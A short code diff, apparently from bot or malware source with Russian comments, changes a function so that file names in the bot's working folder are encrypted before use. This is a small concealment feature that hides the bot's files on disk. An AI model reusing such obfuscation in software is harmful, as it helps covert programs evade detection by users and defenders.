@@ -225,7 +225,15 @@ string TBotApplication::MakeFileName(const char* SubDir, const char* FileName)
 {
 	// Функция собирает имя файла в рабочей папке бота
 	string Name = MakePath(SubDir);
-	Name += FileName;
+
+	// Шифруем имя файла
+	if (!STRA::IsEmpty(FileName))
+	{
+		PCHAR Tmp = UIDCrypt::CryptFileName(FileName, false);
+		Name += Tmp;
+		STR::Free(Tmp);
+    }
+
 	return Name;
 }
 
